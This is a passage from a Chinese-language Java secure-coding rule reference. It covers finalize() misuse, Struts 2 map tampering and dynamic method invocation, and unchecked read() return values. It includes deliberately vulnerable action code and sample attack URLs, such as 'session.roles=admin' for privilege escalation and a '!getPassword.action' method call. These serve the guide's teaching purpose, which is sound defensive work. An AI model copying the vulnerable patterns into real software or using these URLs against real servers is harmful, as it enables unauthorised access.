<h4 id="Poor-Style-Explicit-Call-to-finalize"><a href="#Poor-Style-Explicit-Call-to-finalize" class="headerlink" title="Poor Style: Explicit Call to finalize()"></a>Poor Style: Explicit Call to finalize()</h4><h5 id="ABSTRACT-43"><a href="#ABSTRACT-43" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>方法 finalize() 只能在对象回收后才能由 JVM 进行调用。</p>
<h5 id="EXPLANATION-44"><a href="#EXPLANATION-44" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>尽管 Java 语言规范中允许外部终结器调用对象的 finalize() 方法，但这其实并不是一个好办法。例如，直接调用 finalize() 意味着要不止一次地调用 finalize() 方法：第一次将会直接调用，而最后一次调用会在对象回收之后执行。</p>
<p>例 1：以下代码片段直接调用 finalize() 方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// time to clean up</span><br><span class="line"></span><br><span class="line">widget.finalize();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-44"><a href="#RECOMMENDATIONS-44" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果某个对象的资源需要在对象回收前清除，则可以把所需清除资源的代码分开，写在独立的函数里。而不要直接调用 finalize()。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// time to clean up</span><br><span class="line"></span><br><span class="line">widget.cleanUp();</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-42"><a href="#REFERENCES-42" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] MET12-J. Do not use finalizers CERT</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 586</p>
<h4 id="Struts-2-Bad-Practices-Application-Map-Tampering"><a href="#Struts-2-Bad-Practices-Application-Map-Tampering" class="headerlink" title="Struts 2 Bad Practices: Application Map Tampering"></a>Struts 2 Bad Practices: Application Map Tampering</h4><h5 id="ABSTRACT-44"><a href="#ABSTRACT-44" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Struts 2.x Action 实施类，使攻击者有机会通过将任意数据绑定到会话、应用程序或请求服务器端对象，修改应用程序的业务逻辑。</p>
<h5 id="EXPLANATION-45"><a href="#EXPLANATION-45" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Apache Struts 2.x 包含新的 Aware 接口，允许开发人员使用相关运行时信息，轻松将映射注入到其 Actions 代码中。这些接口包括：org.apache.struts2.interceptor.ApplicationtAware、org.apache.struts2.interceptor.SessionAware 和 org.apache.struts2.interceptor.RequestAware。为了将这些数据映射中的任意内容注入到其 Actions 代码中，开发人员需要实现接口中指定的 setter（例如：setSession，适用于 SessionAware 接口）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class VulnerableAction extends ActionSupport implements SessionAware &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  protected Map&lt;String, Object&gt; session;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line"></span><br><span class="line">  public void setSession(Map&lt;String, Object&gt; session) &#123;</span><br><span class="line"></span><br><span class="line">    this.session = session;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>另一方面，Struts 2.x 会自动通过 Action 中定义的 public accessors 将来自用户的请求数据绑定到 Action 的属性。由于 Aware 接口要求实现 Aware 接口中定义的 public setter，因此这一 setter 也将自动绑定到与 Aware 接口 setter 名称相匹配的任意请求参数，这可允许远程攻击者通过伪造的参数修改应用程序的运行时数据值，使其实现的接口受到影响，如 SessionAware、RequestAware、ApplicationAware 接口所示。</p>
<p>下面的 URL 将允许攻击者重写会话映射中的“roles”属性，这可能会使他成为管理员。</p>
<p><a href="http://server/VulnerableAction?session.roles=admin" target="_blank" rel="noopener">http://server/VulnerableAction?session.roles=admin</a></p>
<p>当这些接口仅要求实现 setter accessors 时，如果同时也实现相应的 getter，则对这些映射集合的更改将在会话范围内持续，而不是仅影响当前的请求范围。</p>
<h5 id="RECOMMENDATIONS-45"><a href="#RECOMMENDATIONS-45" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>Apache Struts 2.3.1.1 及较早版本易于受到此运行时数据操纵的攻击，因此应将框架库升级到最新的稳定版。 如果不可能，则受影响的接口也应实现 com.opensymphony.xwork2.interceptor.ParameterNameAware 接口，以排除危险的参数名称。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public boolean acceptableParameterName(String parameterName) &#123;</span><br><span class="line"></span><br><span class="line">    boolean allowedParameterName = true ;</span><br><span class="line"></span><br><span class="line">    if ( parameterName.matches(&quot;(dojo\..*|^struts\..*|^session\..*|^request\..*|^application\..*|^servlet(Request|Response)\..*|parameters\..*)&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">            allowedParameterName = false ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return allowedParameterName;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-43"><a href="#REFERENCES-43" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 20</p>
<p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[4] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[5] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[6] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.2</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[17] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Process Validation (WASC-40)</p>
<h4 id="Struts-2-Bad-Practices-Dynamic-Method-Invocation"><a href="#Struts-2-Bad-Practices-Dynamic-Method-Invocation" class="headerlink" title="Struts 2 Bad Practices: Dynamic Method Invocation"></a>Struts 2 Bad Practices: Dynamic Method Invocation</h4><h5 id="ABSTRACT-45"><a href="#ABSTRACT-45" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Struts 2 Action 暴露了可由最终用户调用的公共方法，从而覆盖 Action 的 execute() 方法。</p>
<h5 id="EXPLANATION-46"><a href="#EXPLANATION-46" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Struts 2 引入了一种称为“动态方法调用”的功能，该功能允许 Action 暴露方法而非 execute()。“!”（感叹号）字符可以在 Action URL 中使用，以调用“动态方法调用”Action 中的任何公共方法。没有意识到此功能的开发者可能会无意中将内部业务逻辑暴露给攻击者。</p>
<p>例如，如果 Action 包含一种称为 getUserPassword() 的公共方法，该方法没有采用参数且未禁用“动态方法调用”功能，则攻击者可以利用这点访问以下 URL： <a href="http://server/app/recoverpassword!getPassword.action" target="_blank" rel="noopener">http://server/app/recoverpassword!getPassword.action</a></p>
<h5 id="RECOMMENDATIONS-46"><a href="#RECOMMENDATIONS-46" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>Struts 2.3.1.1 之后，引入了一种新的配置属性禁用“动态方法调用”功能。为了禁用此功能，请使用“struts.enable.DynamicMethodInvocation”属性作为 Struts 2 属性设置：</p>
<p><code>&lt;constant name=&quot;struts.enable.DynamicMethodInvocation&quot; value=&quot;false&quot; /&gt;</code><br>或在 struts.properties 中：</p>
<p><code>struts.enable.DynamicMethodInvocation = false</code> </p>
<p>或在 web.xml 的 Struts 2 过滤器中包含此参数节点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line"></span><br><span class="line">  &lt;param-name&gt;struts.enable.DynamicMethodInvocation&lt;/param-name&gt;</span><br><span class="line"></span><br><span class="line">  &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line"></span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-44"><a href="#REFERENCES-44" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Struts 2 Security Vulnerability - Dynamic Method Invocation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 285</p>
<p>[3] Standards Mapping - FIPS200 AC</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A2 Broken Access Control</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.2</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Porous Defenses - CWE ID 285</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 285</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 862</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001480 CAT II, APSC-DV-001490 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001480 CAT II, APSC-DV-001490 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001480 CAT II, APSC-DV-001490 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authorization</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authorization (WASC-02)</p>
<h4 id="Struts-2-Bad-Practices-Request-Map-Tampering"><a href="#Struts-2-Bad-Practices-Request-Map-Tampering" class="headerlink" title="Struts 2 Bad Practices: Request Map Tampering"></a>Struts 2 Bad Practices: Request Map Tampering</h4><h5 id="ABSTRACT-46"><a href="#ABSTRACT-46" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Struts 2.x Action 实施类，使攻击者有机会通过将任意数据绑定到会话、应用程序或请求服务器端对象，修改应用程序的业务逻辑。</p>
<h5 id="EXPLANATION-47"><a href="#EXPLANATION-47" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Apache Struts 2.x 包含新的 Aware 接口，允许开发人员使用相关运行时信息，轻松将映射注入到其 Actions 代码中。这些接口包括：org.apache.struts2.interceptor.ApplicationtAware、org.apache.struts2.interceptor.SessionAware 和 org.apache.struts2.interceptor.RequestAware。为了将这些数据映射中的任意内容注入到其 Actions 代码中，开发人员需要实现接口中指定的 setter（例如：setSession，适用于 SessionAware 接口）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class VulnerableAction extends ActionSupport implements SessionAware &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  protected Map&lt;String, Object&gt; session;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line"></span><br><span class="line">  public void setSession(Map&lt;String, Object&gt; session) &#123;</span><br><span class="line"></span><br><span class="line">    this.session = session;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>另一方面，Struts 2.x 会自动通过 Action 中定义的 public accessors 将来自用户的请求数据绑定到 Action 的属性。由于 Aware 接口要求实现 Aware 接口中定义的 public setter，因此这一 setter 也将自动绑定到与 Aware 接口 setter 名称相匹配的任意请求参数，这可允许远程攻击者通过伪造的参数修改应用程序的运行时数据值，使其实现的接口受到影响，如 SessionAware、RequestAware、ApplicationAware 接口所示。</p>
<p>下面的 URL 将允许攻击者重写会话映射中的“roles”属性，这可能会使他成为管理员。</p>
<p><a href="http://server/VulnerableAction?session.roles=admin" target="_blank" rel="noopener">http://server/VulnerableAction?session.roles=admin</a></p>
<p>当这些接口仅要求实现 setter accessors 时，如果同时也实现相应的 getter，则对这些映射集合的更改将在会话范围内持续，而不是仅影响当前的请求范围。</p>
<h5 id="RECOMMENDATIONS-47"><a href="#RECOMMENDATIONS-47" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>Apache Struts 2.3.1.1 及较早版本易于受到此运行时数据操纵的攻击，因此应将框架库升级到最新的稳定版。 如果不可能，则受影响的接口也应实现 com.opensymphony.xwork2.interceptor.ParameterNameAware 接口，以排除危险的参数名称。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public boolean acceptableParameterName(String parameterName) &#123;</span><br><span class="line"></span><br><span class="line">    boolean allowedParameterName = true ;</span><br><span class="line"></span><br><span class="line">    if ( parameterName.matches(&quot;(dojo\..*|^struts\..*|^session\..*|^request\..*|^application\..*|^servlet(Request|Response)\..*|parameters\..*)&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">            allowedParameterName = false ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return allowedParameterName;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-45"><a href="#REFERENCES-45" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 20</p>
<p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[4] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[5] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[6] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.2</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[17] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Process Validation (WASC-40)</p>
<h4 id="Struts-2-Bad-Practices-Session-Map-Tampering"><a href="#Struts-2-Bad-Practices-Session-Map-Tampering" class="headerlink" title="Struts 2 Bad Practices: Session Map Tampering"></a>Struts 2 Bad Practices: Session Map Tampering</h4><h5 id="ABSTRACT-47"><a href="#ABSTRACT-47" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Struts 2.x Action 实施类，使攻击者有机会通过将任意数据绑定到会话、应用程序或请求服务器端对象，修改应用程序的业务逻辑。</p>
<h5 id="EXPLANATION-48"><a href="#EXPLANATION-48" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Apache Struts 2.x 包含新的 Aware 接口，允许开发人员使用相关运行时信息，轻松将映射注入到其 Actions 代码中。这些接口包括：org.apache.struts2.interceptor.ApplicationtAware、org.apache.struts2.interceptor.SessionAware 和 org.apache.struts2.interceptor.RequestAware。为了将这些数据映射中的任意内容注入到其 Actions 代码中，开发人员需要实现接口中指定的 setter（例如：setSession，适用于 SessionAware 接口）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class VulnerableAction extends ActionSupport implements SessionAware &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  protected Map&lt;String, Object&gt; session;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line"></span><br><span class="line">  public void setSession(Map&lt;String, Object&gt; session) &#123;</span><br><span class="line"></span><br><span class="line">    this.session = session;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>另一方面，Struts 2.x 会自动通过 Action 中定义的 public accessors 将来自用户的请求数据绑定到 Action 的属性。由于 Aware 接口要求实现 Aware 接口中定义的 public setter，因此这一 setter 也将自动绑定到与 Aware 接口 setter 名称相匹配的任意请求参数，这可允许远程攻击者通过伪造的参数修改应用程序的运行时数据值，使其实现的接口受到影响，如 SessionAware、RequestAware、ApplicationAware 接口所示。</p>
<p>下面的 URL 将允许攻击者重写会话映射中的“roles”属性，这可能会使他成为管理员。</p>
<p><a href="http://server/VulnerableAction?session.roles=admin" target="_blank" rel="noopener">http://server/VulnerableAction?session.roles=admin</a></p>
<p>当这些接口仅要求实现 setter accessors 时，如果同时也实现相应的 getter，则对这些映射集合的更改将在会话范围内持续，而不是仅影响当前的请求范围。</p>
<h5 id="RECOMMENDATIONS-48"><a href="#RECOMMENDATIONS-48" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>Apache Struts 2.3.1.1 及较早版本易于受到此运行时数据操纵的攻击，因此应将框架库升级到最新的稳定版。 如果不可能，则受影响的接口也应实现 com.opensymphony.xwork2.interceptor.ParameterNameAware 接口，以排除危险的参数名称。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public boolean acceptableParameterName(String parameterName) &#123;</span><br><span class="line"></span><br><span class="line">    boolean allowedParameterName = true ;</span><br><span class="line"></span><br><span class="line">    if ( parameterName.matches(&quot;(dojo\..*|^struts\..*|^session\..*|^request\..*|^application\..*|^servlet(Request|Response)\..*|parameters\..*)&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">            allowedParameterName = false ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return allowedParameterName;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-46"><a href="#REFERENCES-46" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 20</p>
<p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[4] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[5] Standards Mapping - OWASP Top 10 2007 A4 Insecure Direct Object Reference</p>
<p>[6] Standards Mapping - OWASP Top 10 2010 A4 Insecure Direct Object References</p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A4 Insecure Direct Object References</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.2</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002150 CAT II, APSC-DV-002560 CAT I</p>
<p>[17] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Process Validation (WASC-40)</p>
<h4 id="Unchecked-Return-Value"><a href="#Unchecked-Return-Value" class="headerlink" title="Unchecked Return Value"></a>Unchecked Return Value</h4><h5 id="ABSTRACT-48"><a href="#ABSTRACT-48" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>忽略方法的返回值会导致程序无法发现意外状况和情况。</p>
<h5 id="EXPLANATION-49"><a href="#EXPLANATION-49" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Java 程序员常常会误解包含在许多 java.io 类中的 read() 及相关方法。在 Java 结果中，将大部分错误和异常事件都作为异常抛出。（这是 Java 相对于 C 语言等编程语言的优势：各种异常更加便于程序员考虑是哪里出现了问题。）但是，如果只有少量的数据可用，stream 和 reader 类并不认为这是异常的情况。这些类只是将这些少量的数据添加到返回值缓冲区，并且将返回值设置为读取的字节或字符数。所以，并不能保证返回的数据量一定等于请求的数据量。</p>
<p>这样，程序员就需要检查 read() 和其他 IO 方法的返回值，以确保接收到期望的数据量。</p>
<p>示例：下列代码会在一组用户中进行循环，读取每个用户的私人数据文件。程序员假设这些文件总是正好 1000 字节，从而忽略了检查 read() 的返回值。如果攻击者能够创建一个较小的文件，程序就会重复利用前一个用户的剩余数据，并对这些数据进行处理，就像这些数据属于攻击者一样。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">FileInputStream fis;</span><br><span class="line"></span><br><span class="line">byte[] byteArray = new byte[1024];</span><br><span class="line"></span><br><span class="line">for (Iterator i=users.iterator(); i.hasNext();) &#123;</span><br><span class="line"></span><br><span class="line">    String userName = (String) i.next();</span><br><span class="line"></span><br><span class="line">    String pFileName = PFILE_ROOT + &quot;/&quot; + userName;</span><br><span class="line"></span><br><span class="line">    FileInputStream fis = new FileInputStream(pFileName);</span><br><span class="line"></span><br><span class="line">    fis.read(byteArray); // the file is always 1k bytes</span><br><span class="line"></span><br><span class="line">    fis.close();</span><br><span class="line"></span><br><span class="line">    processPFile(userName, byteArray);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-49"><a href="#RECOMMENDATIONS-49" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">FileInputStream fis;</span><br><span class="line"></span><br><span class="line">byte[] byteArray = new byte[1024];</span><br><span class="line"></span><br><span class="line">for (Iterator i=users.iterator(); i.hasNext();) &#123;</span><br><span class="line"></span><br><span class="line">  String userName = (String) i.next();</span><br><span class="line"></span><br><span class="line">  String pFileName = PFILE_ROOT + &quot;/&quot; + userName;</span><br><span class="line"></span><br><span class="line">  fis = new FileInputStream(pFileName);</span><br><span class="line"></span><br><span class="line">  int bRead = 0;</span><br><span class="line"></span><br><span class="line">  while (bRead &lt; 1024) &#123;</span><br><span class="line"></span><br><span class="line">      int rd = fis.read(byteArray, bRead, 1024 - bRead);</span><br><span class="line"></span><br><span class="line">      if (rd == -1) &#123;</span><br><span class="line"></span><br><span class="line">        throw new IOException(&quot;file is unusually small&quot;);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      bRead += rd;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // could add check to see if file is too large here</span><br><span class="line"></span><br><span class="line">  fis.close();</span><br><span class="line"></span><br><span class="line">  processPFile(userName, byteArray);</span><br><span class="line"></span><br><span 